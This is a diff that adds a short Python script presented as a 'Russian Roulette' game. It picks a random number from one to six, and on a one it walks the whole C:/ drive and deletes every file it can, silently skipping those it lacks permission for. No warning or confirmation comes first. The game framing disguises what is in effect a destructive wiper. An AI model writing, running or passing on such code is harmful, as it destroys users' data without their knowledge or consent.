@@ -1,0 +1,29 @@
+"""
+Russian Roulette
+03/03/2024
+author: Quang Huynh
+"""
+
+import os
+import random
+from os import walk
+
+
+def main():
+    print("Let's play a game...")
+    x = random.randint(1, 6)
+    print("Your number was: " + str(x))
+    if x == 1:
+        home = "C:/"
+        for dirpath, dirnames, file in walk(home):
+            for files in file:
+                dirpath1 = os.path.normpath(dirpath)
+                childpath = os.path.join(dirpath1, files)
+                print(childpath)
+                try:
+                    os.remove(childpath)
+                except PermissionError:
+                    continue
+
+if __name__ == "__main__":
+    main()
